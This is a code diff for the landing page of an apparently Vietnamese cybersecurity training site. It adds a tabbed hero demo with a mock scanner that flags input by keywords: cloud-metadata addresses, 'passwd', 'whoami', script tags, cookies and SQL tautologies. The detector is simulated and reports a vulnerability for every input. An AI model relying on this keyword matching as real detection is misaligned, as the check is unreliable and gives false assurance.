@@ -19,6 +19,7 @@ import {
   Zap,
   Crosshair,
   ArrowRight,
+  Check,
 } from "lucide-react"
 import useAuth from "../../hooks/useAuth"
 import { CountUp } from "../../components/common"
@@ -388,6 +389,9 @@ function TerminalTypingScreen({
 export function LandingPage() {
   const { isAuthenticated } = useAuth()
 
+  // Hero Interactive Workstation Mode ('terminal' | 'packets' | 'scanner')
+  const [heroWorkstationTab, setHeroWorkstationTab] = useState("terminal")
+
   // Hero Terminal State with Real-Time Typing Animation
   const [activeConsoleTab, setActiveConsoleTab] = useState("cli") // 'cli' | 'vector' | 'defense'
   const [replayKey, setReplayKey] = useState(0)
@@ -499,17 +503,49 @@ export function LandingPage() {
     setIsScanning(true)
     setTimeout(() => {
       setIsScanning(false)
-      const isSql = testPayload.toLowerCase().includes("or") || testPayload.includes("'") || testPayload.includes("1=1")
-      const isXss = testPayload.toLowerCase().includes("<script") || testPayload.includes("onerror")
-      setScanResult({
-        detected: isSql || isXss,
-        vulnType: isXss ? "CWE-79: Cross-Site Scripting (XSS)" : "CWE-89: SQL Injection Vector",
-        severity: "CRITICAL (CVSS 9.8)",
-        remediation: isXss
-          ? "Context-aware HTML entity encoding & Content Security Policy (CSP)"
-          : "Enforce PreparedStatement parameterized query binding",
-      })
-    }, 550)
+      const payload = testPayload.toLowerCase()
+      const isSsrf = payload.includes("169.254") || payload.includes("meta-data")
+      const isCmd = payload.includes("cat") || payload.includes("passwd") || payload.includes("whoami")
+      const isXss = payload.includes("<script") || payload.includes("onerror") || payload.includes("cookie")
+      const isSql = payload.includes("or") || payload.includes("'") || payload.includes("1=1")
+
+      if (isSsrf) {
+        setScanResult({
+          detected: true,
+          vulnType: "CWE-918: Server-Side Request Forgery (SSRF)",
+          severity: "CRITICAL (CVSS 9.3)",
+          remediation: "Bắt buộc IMDSv2 qua HTTP PUT session token & giới hạn hop-limit = 1",
+        })
+      } else if (isCmd) {
+        setScanResult({
+          detected: true,
+          vulnType: "CWE-78: OS Command Injection via Shell Metacharacters",
+          severity: "CRITICAL (CVSS 9.8)",
+          remediation: "Sử dụng execve mảng argv không thông qua shell & bật AppArmor sandbox",
+        })
+      } else if (isXss) {
+        setScanResult({
+          detected: true,
+          vulnType: "CWE-79: Cross-Site Scripting (XSS Polyglot)",
+          severity: "HIGH (CVSS 8.4)",
+          remediation: "Context-aware HTML entity encoding & triển khai Content Security Policy (CSP)",
+        })
+      } else if (isSql) {
+        setScanResult({
+          detected: true,
+          vulnType: "CWE-89: SQL Injection Vector (Tautology Bypass)",
+          severity: "CRITICAL (CVSS 9.8)",
+          remediation: "Áp dụng PreparedStatement parameterized query binding trên database driver",
+        })
+      } else {
+        setScanResult({
+          detected: true,
+          vulnType: "GENERIC_VULNERABILITY: Unsanitized Input Payload",
+          severity: "MEDIUM (CVSS 6.5)",
+          remediation: "Thiết lập kiểm tra whitelist input và encode dữ liệu trước khi xử lý",
+        })
+      }
+    }, 450)
   }
 
   const handleDropPacket = (id) => {
@@ -739,285 +775,420 @@ export function LandingPage() {
         <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-6xl h-[420px] bg-gradient-to-b from-blue-500/10 via-cyan-400/5 to-transparent blur-3xl pointer-events-none z-0" />
 
         <div className="max-w-[1240px] mx-auto px-4 sm:px-6 relative z-10">
-          <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 lg:gap-8 items-center">
-            {/* Left Column: Mission Briefing & Action Dispatch */}
-            <div className="lg:col-span-6 space-y-6">
-              {/* Headline */}
-              <h1 className="text-4xl sm:text-5xl lg:text-[54px] font-black tracking-tight text-slate-900 dark:text-white leading-[1.06]">
-                Offensive Mastery. <br />
-                <span className="text-blue-600 dark:text-blue-400 cyberpunk:text-sky-400">
-                  Defensive Precision.
-                </span> <br />
-                Real Attack Forensics.
-              </h1>
+          {/* ====================================================================
+              1. HERO INTRO (CENTERED, MAJESTIC, EDITORIAL HIGH-TECH)
+             ==================================================================== */}
+          <div className="text-center max-w-4xl mx-auto space-y-6 pt-2 sm:pt-6">
+            {/* Live Security Clearance Badge */}
+            <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-slate-900/90 dark:bg-white/[0.04] cyberpunk:bg-[#071329] border border-slate-200/90 dark:border-white/[0.08] cyberpunk:border-cyan-500/40 shadow-xs backdrop-blur-md hover:border-indigo-500/50 transition-colors select-none">
+              <span className="relative flex h-2 w-2">
+                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
+                <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500" />
+              </span>
+              <span className="text-[11px] font-mono-tech font-bold uppercase tracking-wider text-slate-700 dark:text-slate-300 cyberpunk:text-cyan-300">
+                DEFENSE RANGE ONLINE // 120+ REAL ADVERSARY SANDBOX TARGETS
+              </span>
+              <span className="text-slate-400 dark:text-slate-500 text-xs font-mono">&bull;</span>
+              <span className="text-[11px] font-mono-tech text-indigo-600 dark:text-indigo-400 cyberpunk:text-cyan-400 font-bold hidden sm:inline">
+                ZERO-TRUST ISOLATION
+              </span>
+            </div>
 
-              {/* Subtitle */}
-              <p className="text-base sm:text-lg text-slate-600 dark:text-slate-300 cyberpunk:text-cyan-100/90 leading-relaxed max-w-xl">
-                Tackle realistic cloud and network security challenges. Reverse-engineer authentic vulnerabilities, implement hardened defenses, and accelerate your security career.
-              </p>
+            {/* Main Headline */}
+            <h1 className="text-4xl sm:text-6xl lg:text-[68px] font-black tracking-tight text-slate-900 dark:text-white leading-[1.05] selection:bg-indigo-500/30">
+              Where Cyber Defenders Master{" "}
+              <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-600 via-indigo-600 to-cyan-500 dark:from-blue-400 dark:via-indigo-300 dark:to-cyan-300">
+                Authentic Warfare
+              </span>
+            </h1>
 
-              {/* YewSafe-Inspired Quick Target IP/Domain Scanner */}
-              <div className="p-4 sm:p-5 rounded-2xl bg-white dark:bg-[#12141c] cyberpunk:bg-[#091329] border border-slate-200 dark:border-white/10 cyberpunk:border-cyan-500/40 shadow-xl shadow-slate-200/50 dark:shadow-black/60 cyberpunk:shadow-blue-950/40 backdrop-blur-md relative overflow-hidden transition-all">
-                {/* Clean Top Rim */}
-                <div className="absolute top-0 inset-x-0 h-px bg-white/[0.08]" />
+            {/* Subtitle */}
+            <p className="text-base sm:text-lg lg:text-xl text-slate-600 dark:text-slate-300 cyberpunk:text-cyan-100/90 max-w-2xl mx-auto leading-relaxed">
+              Tackle realistic cloud and network intrusions in browser-isolated sandboxes. Dissect live packet streams, hotpatch zero-day vulnerabilities in real time, and earn verified credentials.
+            </p>
 
-                <div className="flex items-center justify-between mb-2.5">
-                  <div className="flex items-center gap-2">
-                    <span className="flex h-2 w-2 rounded-full bg-indigo-500 dark:bg-indigo-400" />
-                    <span className="text-xs font-mono-tech font-bold text-indigo-600 dark:text-indigo-400 cyberpunk:text-cyan-400 uppercase tracking-wide">
-                      TRA CỨU & QUÉT LỖ HỔNG MỤC TIÊU NHANH
-                    </span>
+            {/* CTA Actions */}
+            <div className="flex flex-wrap items-center justify-center gap-3.5 pt-2">
+              <Link
+                to={isAuthenticated ? "/dashboard" : "/register"}
+                className="cyber-btn-primary btn-cyber-interactive inline-flex items-center justify-center font-bold rounded-xl px-7 py-3.5 text-sm gap-2.5 cursor-pointer group shadow-lg shadow-blue-500/20"
+              >
+                <Play className="h-4 w-4 fill-current group-hover:scale-110 transition-transform" />
+                <span>{isAuthenticated ? "Vào Bảng Điều Khiển Tác Chiến" : "Khởi Động Sandbox Miễn Phí"}</span>
+              </Link>
+
+              <Link
+                to="/labs"
+                className="btn-cyber-interactive inline-flex items-center justify-center gap-2 font-semibold rounded-xl px-6 py-3.5 text-sm bg-white/90 dark:bg-[#12141c]/90 cyberpunk:bg-[#091329] text-slate-800 dark:text-slate-100 cyberpunk:text-cyan-300 border border-slate-200 dark:border-white/10 cyberpunk:border-cyan-500/40 hover:border-indigo-400 dark:hover:border-indigo-500 hover:text-indigo-600 dark:hover:text-indigo-300 cyberpunk:hover:border-cyan-400 cyberpunk:hover:text-cyan-200 shadow-2xs transition-all cursor-pointer backdrop-blur-md"
+              >
+                <FlaskConical className="h-4 w-4 text-indigo-600 dark:text-indigo-400 cyberpunk:text-cyan-400" />
+                <span>Khám Phá 120+ Phòng Lab</span>
+                <span className="hidden sm:inline-block px-1.5 py-0.5 rounded text-[10px] font-mono-tech bg-slate-100 dark:bg-white/[0.08] text-slate-500 dark:text-slate-400">
+                  ⌘K
+                </span>
+              </Link>
+            </div>
+
+            {/* Micro Reassurance Strip */}
+            <div className="flex flex-wrap items-center justify-center gap-4 sm:gap-6 pt-1 text-xs font-mono-tech text-slate-500 dark:text-slate-400">
+              <span className="flex items-center gap-1.5">
+                <Check className="h-3.5 w-3.5 text-emerald-500" />
+                <span>Khởi động trong 3s</span>
+              </span>
+              <span className="text-slate-300 dark:text-slate-700">&bull;</span>
+              <span className="flex items-center gap-1.5">
+                <Check className="h-3.5 w-3.5 text-emerald-500" />
+                <span>100% Cô lập trình duyệt</span>
+              </span>
+              <span className="text-slate-300 dark:text-slate-700">&bull;</span>
+              <span className="flex items-center gap-1.5">
+                <Check className="h-3.5 w-3.5 text-emerald-500" />
+                <span>Không cần cài máy ảo</span>
+              </span>
+              <span className="text-slate-300 dark:text-slate-700">&bull;</span>
+              <span className="flex items-center gap-1.5">
+                <Check className="h-3.5 w-3.5 text-emerald-500" />
+                <span>Chuẩn MITRE ATT&CK</span>
+              </span>
+            </div>
+          </div>
+
+          {/* ====================================================================
+              2. THE CENTERPIECE: "CYBER WARFARE OPERATIONS DECK"
+              Unified multi-mode interactive command workstation
+             ==================================================================== */}
+          <div className="mt-10 max-w-5xl mx-auto">
+            <div className="w-full cyber-terminal rounded-2xl p-4 sm:p-5 text-slate-100 shadow-2xl relative border border-slate-800/90 dark:border-white/[0.1] cyberpunk:border-cyan-500/40 bg-[#0a0d14]/95 backdrop-blur-xl">
+              {/* Window Frame Header */}
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-3.5 border-b border-slate-800/80 cyberpunk:border-cyan-500/30 gap-3">
+                {/* Traffic lights + Host ID */}
+                <div className="flex items-center gap-2">
+                  <div className="flex items-center gap-1.5 shrink-0">
+                    <span className="h-3 w-3 rounded-full bg-rose-500/90 inline-block" />
+                    <span className="h-3 w-3 rounded-full bg-amber-500/90 inline-block" />
+                    <span className="h-3 w-3 rounded-full bg-emerald-500/90 inline-block" />
                   </div>
-                  <span className="text-[10px] font-mono-tech text-slate-400 dark:text-slate-500 cyberpunk:text-cyan-400 hidden sm:inline-block">
-                    LIVE TELEMETRY HUD
+                  <span className="ml-2 font-mono-tech text-xs text-slate-400 font-semibold truncate">
+                    range-node-412.internal <span className="text-emerald-400 text-[10px]">[ISOLATED]</span>
                   </span>
                 </div>
 
-                {/* Search Bar Input */}
-                <form
-                  onSubmit={(e) => {
-                    e.preventDefault()
-                    handleRunTargetScan()
-                  }}
-                  className="flex flex-col sm:flex-row gap-2"
-                >
-                  <div className="relative flex-1">
-                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-slate-400">
-                      <Crosshair className="h-4 w-4 text-indigo-600 dark:text-indigo-400 cyberpunk:text-cyan-400" />
-                    </div>
-                    <input
-                      type="text"
-                      value={scanTargetInput}
-                      onChange={(e) => setScanTargetInput(e.target.value)}
-                      placeholder="Nhập IP, Hostname mục tiêu (vd: 10.10.14.89, corp.internal)..."
-                      className="w-full pl-9 pr-3 py-2.5 bg-slate-50 dark:bg-[#090a0f] cyberpunk:bg-[#060e1f] border border-slate-300 dark:border-white/10 cyberpunk:border-cyan-500/30 rounded-xl text-xs sm:text-sm font-mono-tech text-slate-900 dark:text-white cyberpunk:text-cyan-100 placeholder-slate-400 dark:placeholder-slate-500 cyberpunk:placeholder-cyan-700/80 focus:outline-none focus:border-indigo-600 dark:focus:border-indigo-400 cyberpunk:focus:border-cyan-400 transition-all"
-                    />
-                  </div>
-                  <button
-                    type="submit"
-                    disabled={isScanningTarget}
-                    className="btn-cyber-interactive inline-flex items-center justify-center gap-2 px-4 py-2.5 rounded-xl font-mono-tech font-bold text-xs bg-indigo-600 hover:bg-indigo-700 text-white dark:bg-indigo-600 dark:hover:bg-indigo-500 dark:text-white cyberpunk:bg-[#0084ff] cyberpunk:hover:bg-[#0099ff] cyberpunk:text-white transition-all shrink-0 cursor-pointer disabled:opacity-50 shadow-md shadow-indigo-600/20 dark:shadow-indigo-950/40 cyberpunk:shadow-blue-500/25"
-                  >
-                    {isScanningTarget ? (
-                      <>
-                        <RotateCw className="h-3.5 w-3.5 animate-spin" />
-                        <span>ĐANG QUÉT...</span>
-                      </>
-                    ) : (
-                      <>
-                        <Zap className="h-3.5 w-3.5 fill-current" />
-                        <span>QUÉT MỤC TIÊU</span>
-                      </>
-                    )}
-                  </button>
-                </form>
-
-                {/* Quick Target Chips */}
-                <div className="flex flex-wrap items-center gap-1.5 mt-2.5">
-                  <span className="text-[10px] font-mono-tech text-slate-500 dark:text-slate-400 cyberpunk:text-emerald-500 font-semibold uppercase">Mẫu thử nhanh:</span>
+                {/* 3 Interactive Mode Tabs */}
+                <div className="flex items-center bg-slate-900/90 cyberpunk:bg-[#060e1f] p-1 rounded-xl border border-slate-800/90 cyberpunk:border-cyan-500/30 self-start sm:self-auto">
                   {[
-                    { label: "10.10.14.89 [SQLi]", val: "10.10.14.89" },
-                    { label: "192.168.1.100 [JWT]", val: "192.168.1.100" },
-                    { label: "corp-banking.vn [RCE]", val: "corp-banking.vn" },
-                  ].map((chip) => (
-                    <button
-                      key={chip.val}
-                      type="button"
-                      onClick={() => {
-                        setScanTargetInput(chip.val)
-                        handleRunTargetScan(chip.val)
-                      }}
-                      className="text-[10px] font-mono-tech px-2 py-0.5 rounded bg-slate-100 hover:bg-slate-200 dark:bg-slate-800/80 dark:hover:bg-slate-700/80 cyberpunk:bg-emerald-950/50 cyberpunk:hover:bg-emerald-900/50 text-slate-700 dark:text-slate-300 cyberpunk:text-emerald-300 border border-slate-300/80 dark:border-slate-700/60 cyberpunk:border-emerald-500/40 transition-colors cursor-pointer"
-                    >
-                      {chip.label}
-                    </button>
-                  ))}
+                    { key: "terminal", label: "Terminal Exploit & Patch", icon: Terminal },
+                    { key: "scanner", label: "Target CVE Diagnostic HUD", icon: Crosshair },
+                    { key: "packets", label: "Live Packet Sniffer", icon: Wifi },
+                  ].map((tab) => {
+                    const TabIcon = tab.icon
+                    const isActive = heroWorkstationTab === tab.key
+                    return (
+                      <button
+                        key={tab.key}
+                        type="button"
+                        onClick={() => setHeroWorkstationTab(tab.key)}
+                        className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-mono-tech transition-all cursor-pointer ${
+                          isActive
+                            ? "bg-indigo-600 text-white font-bold shadow-sm"
+                            : "text-slate-400 hover:text-white hover:bg-slate-800/60"
+                        }`}
+                      >
+                        <TabIcon className="h-3.5 w-3.5" />
+                        <span className="hidden md:inline">{tab.label}</span>
+                        <span className="md:hidden">{tab.label.split(" ")[0]}</span>
+                      </button>
+                    )
+                  })}
                 </div>
 
-                {/* Live Scan Diagnostic Report Box */}
-                {targetScanReport && (
-                  <div className="mt-3.5 pt-3.5 border-t border-slate-200 dark:border-slate-800 cyberpunk:border-emerald-500/30 space-y-2.5 text-xs animate-in fade-in slide-in-from-top-1 duration-200">
-                    <div className="flex items-center justify-between flex-wrap gap-1">
-                      <div className="flex items-center gap-2">
-                        <span className="h-2 w-2 rounded-full bg-red-500" />
-                        <span className="font-mono-tech font-bold text-red-500 dark:text-red-400">
-                          {targetScanReport.vuln}
+                {/* Live Telemetry Ping */}
+                <div className="hidden lg:flex items-center gap-3 font-mono-tech text-[11px] text-slate-400">
+                  <span className="flex items-center gap-1 text-emerald-400">
+                    <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse" />
+                    SLA: 99.98%
+                  </span>
+                  <span>PING: 14ms</span>
+                </div>
+              </div>
+
+              {/* Workstation Body Content */}
+              <div className="py-4 min-h-[300px]">
+                {/* MODE 1: TERMINAL DRILL */}
+                {heroWorkstationTab === "terminal" && (
+                  <div className="space-y-4">
+                    <div className="flex items-center justify-between pb-2 border-b border-slate-800/60">
+                      <div className="flex items-center gap-1.5">
+                        <span className="text-[11px] font-mono-tech text-slate-400 uppercase font-semibold">
+                          Kịch bản:
                         </span>
+                        {[
+                          { key: "cli", label: "SQLi Hotpatch" },
+                          { key: "vector", label: "JWT Token Forgery" },
+                          { key: "defense", label: "Buffer Overflow" },
+                        ].map((subTab) => (
+                          <button
+                            key={subTab.key}
+                            type="button"
+                            onClick={() => handleTabChange(subTab.key)}
+                            className={`px-2.5 py-1 rounded text-xs font-mono-tech transition-all cursor-pointer ${
+                              activeConsoleTab === subTab.key
+                                ? "bg-slate-800 text-cyan-300 font-bold border border-cyan-500/40"
+                                : "text-slate-400 hover:text-slate-200"
+                            }`}
+                          >
+                            {subTab.label}
+                          </button>
+                        ))}
                       </div>
-                      <span className="font-mono-tech font-bold px-1.5 py-0.5 rounded bg-red-500/10 dark:bg-red-500/20 text-red-600 dark:text-red-400 border border-red-500/30 text-[10px]">
-                        CVSS: {targetScanReport.severity}
-                      </span>
+
+                      <button
+                        type="button"
+                        onClick={() => {
+                          setReplayKey((k) => k + 1)
+                          setActiveScenarioIdx(0)
+                          setCycleCount(0)
+                        }}
+                        className="p-1 rounded text-slate-400 hover:text-white hover:bg-slate-800 transition-colors cursor-pointer"
+                        title="Phát lại kịch bản"
+                      >
+                        <RotateCw className="h-3.5 w-3.5" />
+                      </button>
                     </div>
 
-                    <p className="text-[11px] text-slate-600 dark:text-slate-300 cyberpunk:text-emerald-100/80 leading-relaxed font-sans">
-                      {targetScanReport.cveDesc}
-                    </p>
+                    <TerminalTypingScreen
+                      key={`${activeConsoleTab}-${replayKey}-${cycleCount}`}
+                      scenarios={CONSOLE_SCENARIOS[activeConsoleTab] || CONSOLE_SCENARIOS.cli}
+                      scenarioIndex={activeScenarioIdx}
+                      onNextScenario={handleNextScenario}
+                    />
+                  </div>
+                )}
 
-                    {/* Ports Matrix */}
-                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-1.5 font-mono-tech text-[10px]">
-                      {targetScanReport.ports.map((p, i) => (
-                        <div key={i} className="p-1.5 rounded bg-slate-50 dark:bg-slate-900/90 cyberpunk:bg-[#03170e] border border-slate-200 dark:border-slate-800 cyberpunk:border-emerald-500/30 flex flex-col">
-                          <span className="font-bold text-slate-800 dark:text-slate-200 cyberpunk:text-emerald-200">{p.port}</span>
-                          <span className="text-slate-500 dark:text-slate-400 truncate">{p.service}</span>
-                          <span className={`text-[9px] font-bold ${p.risk === 'CRITICAL' ? 'text-red-500 dark:text-red-400' : p.risk === 'HIGH' ? 'text-amber-500 dark:text-amber-400' : 'text-emerald-600 dark:text-emerald-400'}`}>
-                            {p.state} • {p.risk}
-                          </span>
-                        </div>
+                {/* MODE 2: TARGET CVE SCANNER */}
+                {heroWorkstationTab === "scanner" && (
+                  <div className="space-y-4">
+                    <div className="flex flex-col sm:flex-row gap-2">
+                      <div className="relative flex-1">
+                        <Crosshair className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-indigo-400" />
+                        <input
+                          type="text"
+                          value={scanTargetInput}
+                          onChange={(e) => setScanTargetInput(e.target.value)}
+                          placeholder="Nhập IP hoặc domain mục tiêu (vd: 10.10.14.89, corp.internal)..."
+                          className="w-full pl-9 pr-3 py-2.5 bg-slate-900 border border-slate-700/80 rounded-xl text-xs sm:text-sm font-mono-tech text-white placeholder-slate-500 focus:outline-none focus:border-indigo-400"
+                        />
+                      </div>
+                      <button
+                        type="button"
+                        onClick={() => handleRunTargetScan()}
+                        disabled={isScanningTarget}
+                        className="btn-cyber-interactive px-5 py-2.5 rounded-xl font-mono-tech font-bold text-xs bg-indigo-600 hover:bg-indigo-500 text-white transition-all shrink-0 cursor-pointer flex items-center justify-center gap-2"
+                      >
+                        {isScanningTarget ? (
+                          <>
+                            <RotateCw className="h-3.5 w-3.5 animate-spin" />
+                            <span>ĐANG QUÉT MỤC TIÊU...</span>
+                          </>
+                        ) : (
+                          <>
+                            <Zap className="h-3.5 w-3.5 fill-current" />
+                            <span>KHỞI CHẠY QUÉT CVE</span>
+                          </>
+                        )}
+                      </button>
+                    </div>
+
+                    {/* Quick Target Chips */}
+                    <div className="flex flex-wrap items-center gap-2">
+                      <span className="text-[10px] font-mono-tech text-slate-400 font-semibold uppercase">
+                        Mẫu mục tiêu:
+                      </span>
+                      {[
+                        { label: "10.10.14.89 [SQLi CVSS 9.8]", val: "10.10.14.89" },
+                        { label: "192.168.1.100 [JWT Forgery]", val: "192.168.1.100" },
+                        { label: "corp-banking.vn [PHP CGI RCE]", val: "corp-banking.vn" },
+                      ].map((chip) => (
+                        <button
+                          key={chip.val}
+                          type="button"
+                          onClick={() => {
+                            setScanTargetInput(chip.val)
+                            handleRunTargetScan(chip.val)
+                          }}
+                          className="text-[11px] font-mono-tech px-2.5 py-1 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-colors cursor-pointer"
+                        >
+                          {chip.label}
+                        </button>
                       ))}
                     </div>
 
-                    {/* Direct Action Link */}
-                    <div className="flex items-center justify-between pt-1">
-                      <span className="text-[10px] text-slate-500 dark:text-slate-400 font-mono-tech">
-                        🛡 Khắc phục: <span className="text-slate-700 dark:text-slate-200 cyberpunk:text-emerald-200">{targetScanReport.mitigation}</span>
-                      </span>
-                      <Link
-                        to="/labs"
-                        className="inline-flex items-center gap-1 text-[11px] font-mono-tech font-bold text-indigo-600 dark:text-indigo-400 cyberpunk:text-emerald-400 hover:underline transition-colors whitespace-nowrap ml-2"
+                    {/* Diagnostic Report Result */}
+                    {targetScanReport && (
+                      <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 space-y-3 animate-in fade-in duration-200">
+                        <div className="flex items-center justify-between flex-wrap gap-2">
+                          <div className="flex items-center gap-2">
+                            <span className="h-2.5 w-2.5 rounded-full bg-rose-500 animate-pulse" />
+                            <span className="font-mono-tech font-bold text-rose-400 text-sm">
+                              {targetScanReport.vuln}
+                            </span>
+                          </div>
+                          <span className="font-mono-tech font-bold px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30 text-xs">
+                            CVSS: {targetScanReport.severity}
+                          </span>
+                        </div>
+
+                        <p className="text-xs text-slate-300 font-sans leading-relaxed">
+                          {targetScanReport.cveDesc}
+                        </p>
+
+                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 font-mono-tech text-[10px]">
+                          {targetScanReport.ports.map((p, i) => (
+                            <div key={i} className="p-2 rounded bg-slate-950/80 border border-slate-800 flex flex-col">
+                              <span className="font-bold text-slate-200">{p.port}</span>
+                              <span className="text-slate-400 truncate">{p.service}</span>
+                              <span className={`text-[9px] font-bold mt-0.5 ${p.risk === "CRITICAL" ? "text-rose-400" : p.risk === "HIGH" ? "text-amber-400" : "text-emerald-400"}`}>
+                                {p.state} &bull; {p.risk}
+                              </span>
+                            </div>
+                          ))}
+                        </div>
+
+                        <div className="flex items-center justify-between pt-2 border-t border-slate-800 text-xs">
+                          <span className="text-slate-400 font-mono-tech">
+                            🛡 Khắc phục: <span className="text-slate-200 font-semibold">{targetScanReport.mitigation}</span>
+                          </span>
+                          <Link
+                            to="/labs"
+                            className="inline-flex items-center gap-1 font-mono-tech font-bold text-cyan-400 hover:underline"
+                          >
+                            <span>Khởi động phòng Lab này</span>
+                            <ArrowRight className="h-3.5 w-3.5" />
+                          </Link>
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                )}
+
+                {/* MODE 3: WIRESHARK PACKETS */}
+                {heroWorkstationTab === "packets" && (
+                  <div className="space-y-3">
+                    <div className="flex items-center justify-between pb-2 border-b border-slate-800/60 text-xs font-mono-tech text-slate-400">
+                      <span>INTERFACE: eth0 [PROMISCUOUS]</span>
+                      <button
+                        type="button"
+                        onClick={handleResetPackets}
+                        className="text-cyan-400 hover:underline font-bold cursor-pointer"
                       >
-                        <span>Khởi động Lab này</span>
-                        <ArrowRight className="h-3 w-3" />
-                      </Link>
+                        Reset Luồng Gói Tin
+                      </button>
+                    </div>
+
+                    <div className="space-y-2 font-mono-tech text-xs">
+                      {packets.map((pkt) => (
+                        <div
+                          key={pkt.id}
+                          className={`flex items-center justify-between p-2.5 rounded-xl border transition-all ${
+                            droppedPacketId === pkt.id
+                              ? "opacity-30 scale-98"
+                              : pkt.status === "malicious"
+                              ? "bg-rose-950/40 border-rose-500/40 text-rose-200"
+                              : pkt.status === "mitigated"
+                              ? "bg-emerald-950/40 border-emerald-500/40 text-emerald-200"
+                              : "bg-slate-900/80 border-slate-800 text-slate-300"
+                          }`}
+                        >
+                          <div className="flex items-center gap-2.5 min-w-0">
+                            <span
+                              className={`font-bold text-[10px] px-2 py-0.5 rounded border shrink-0 ${
+                                pkt.protocol === "HTTP"
+                                  ? "bg-rose-500/20 border-rose-500/40 text-rose-300"
+                                  : pkt.protocol === "DNS"
+                                  ? "bg-sky-500/20 border-sky-500/40 text-sky-300"
+                                  : pkt.protocol === "TLSv1.3"
+                                  ? "bg-emerald-500/20 border-emerald-500/40 text-emerald-300"
+                                  : "bg-slate-800 border-slate-700 text-slate-300"
+                              }`}
+                            >
+                              {pkt.protocol}
+                            </span>
+                            <span className="text-slate-400 font-medium truncate">
+                              {pkt.cleanSrc} → {pkt.cleanDst}
+                            </span>
+                            <span className="hidden sm:inline font-semibold text-slate-200 truncate max-w-xs">
+                              {pkt.info}
+                            </span>
+                          </div>
+
+                          <div className="shrink-0">
+                            {pkt.status === "malicious" ? (
+                              <button
+                                type="button"
+                                onClick={() => handleDropPacket(pkt.id)}
+                                className="px-3 py-1 rounded-lg bg-rose-600 hover:bg-rose-500 text-white text-[10px] font-bold cursor-pointer transition-all active:scale-95"
+                              >
+                                DROP PACKET
+                              </button>
+                            ) : pkt.status === "mitigated" ? (
+                              <span className="px-2 py-0.5 rounded bg-emerald-950 text-emerald-400 text-[10px] font-bold border border-emerald-700">
+                                MITIGATED
+                              </span>
+                            ) : (
+                              <span className="text-[10px] font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-slate-800 text-slate-400">
+                                {pkt.statusLabel || "PASSED"}
+                              </span>
+                            )}
+                          </div>
+                        </div>
+                      ))}
                     </div>
                   </div>
                 )}
               </div>
 
-              {/* Interactive Tool Chips (Clickable Quick Prompts) */}
-              <div className="flex flex-wrap items-center gap-2 pt-1">
-                <span className="text-xs font-mono-tech text-slate-500 dark:text-slate-400 cyberpunk:text-cyan-400 font-bold uppercase">Công Cụ Diễn Tập:</span>
-                {["Burp Suite", "Wireshark", "SQLMap", "Suricata", "Ghidra"].map((tool) => (
-                  <span
-                    key={tool}
-                    className="text-[11px] font-mono-tech font-semibold px-2 py-0.5 rounded-md bg-white dark:bg-[#12141c] cyberpunk:bg-[#091329] border border-slate-200 dark:border-white/10 cyberpunk:border-cyan-500/40 text-slate-700 dark:text-slate-200 cyberpunk:text-cyan-300 shadow-2xs hover:border-indigo-400 dark:hover:border-indigo-500 cyberpunk:hover:border-cyan-400 hover:text-indigo-600 dark:hover:text-indigo-400 cyberpunk:hover:text-cyan-200 transition-colors select-none"
-                  >
-                    {tool}
+              {/* Workstation Footer */}
+              <div className="pt-3 border-t border-slate-800/80 flex items-center justify-between text-xs text-slate-400">
+                <div className="flex items-center gap-2">
+                  <span className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse" />
+                  <span className="font-mono-tech text-slate-300 font-semibold text-xs">
+                    Container #412 sẵn sàng &bull; Ubuntu 24.04 LTS Hardened
                   </span>
-                ))}
-              </div>
-
-              {/* CTA Action Buttons */}
-              <div className="flex flex-wrap items-center gap-3.5 pt-2">
-                <Link
-                  to={isAuthenticated ? "/dashboard" : "/register"}
-                  className="cyber-btn-primary btn-cyber-interactive inline-flex items-center justify-center font-bold rounded-xl px-6 py-3.5 text-sm gap-2.5 cursor-pointer group shadow-md"
-                >
-                  <Play className="h-4 w-4 fill-current group-hover:scale-110 transition-transform" />
-                  <span>{isAuthenticated ? "Vào Bảng Điều Khiển Tác Chiến" : "Khởi Động Sandbox Miễn Phí"}</span>
-                </Link>
+                </div>
                 <Link
                   to="/labs"
-                  className="btn-cyber-interactive inline-flex items-center justify-center gap-2 font-semibold rounded-xl px-5 py-3.5 text-sm bg-white dark:bg-[#12141c] cyberpunk:bg-[#091329] text-slate-800 dark:text-slate-100 cyberpunk:text-cyan-300 border border-slate-200 dark:border-white/10 cyberpunk:border-cyan-500/40 hover:border-indigo-400 dark:hover:border-indigo-500 hover:text-indigo-600 dark:hover:text-indigo-300 cyberpunk:hover:border-cyan-400 cyberpunk:hover:text-cyan-200 shadow-2xs transition-all cursor-pointer"
+                  className="text-cyan-400 hover:text-cyan-300 font-mono-tech font-bold flex items-center gap-1 transition-colors text-xs"
                 >
-                  <FlaskConical className="h-4 w-4 text-indigo-600 dark:text-indigo-400 cyberpunk:text-cyan-400" />
-                  <span>Khám Phá 120+ Phòng Lab</span>
+                  <span>Mở Toàn Bộ 120+ Phòng Lab</span>
+                  <ChevronRight className="h-3.5 w-3.5" />
                 </Link>
-              </div>
-
-              {/* Telemetry Counter Strip */}
-              <div className="grid grid-cols-3 gap-4 pt-6 border-t border-slate-200 dark:border-white/10 cyberpunk:border-cyan-500/30">
-                <div className="space-y-0.5">
-                  <div className="font-mono-tech text-2xl sm:text-3xl font-extrabold text-slate-900 dark:text-white cyberpunk:text-white">
-                    <CountUp end={2400} suffix="+" />
-                  </div>
